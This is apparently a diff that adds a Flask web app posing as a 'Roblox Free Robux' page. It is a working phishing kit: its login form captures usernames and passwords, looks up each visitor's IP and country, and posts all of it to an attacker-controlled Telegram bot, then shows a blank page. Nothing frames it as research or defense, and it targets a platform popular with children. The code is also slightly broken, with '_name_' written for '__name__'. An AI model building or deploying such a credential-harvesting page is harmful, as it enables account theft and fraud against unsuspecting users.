@@ -1,0 +1,73 @@
+from flask import Flask, request, render_template_string
+import requests
+from datetime import datetime
+
+app = Flask(_name_)
+
+# Telegram Bot Configuration
+BOT_TOKEN = '##########'
+CHAT_ID = '#########'
+
+# HTML template for the login form
+login_form = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Free Robux</title>
+</head>
+<body>
+    <h1>Welcome to Roblox Free Robux</h1>
+    <form action="/login" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username"><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
+"""
+
+def get_country_by_ip(ip):
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        data = response.json()
+        return data.get("country", "Unknown")
+    except Exception as e:
+        print(f"Error getting country: {e}")
+        return "Unknown"
+
+@app.route('/')
+def home():
+    return render_template_string(login_form)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    
+    login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    
+    user_ip = request.remote_addr
+
+    
+    country = get_country_by_ip(user_ip)
+
+    
+    message = f"Username: {username}\nPassword: {password}\nTime: {login_time}\nIP: {user_ip}\nCountry: {country}"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {
+        'chat_id': CHAT_ID,
+        'text': message
+    }
+    requests.post(url, data=data)
+
+    return ""
+
+if _name_ == '_main_':
+    
+    app.run(host='0.0.0.0', port=5000)
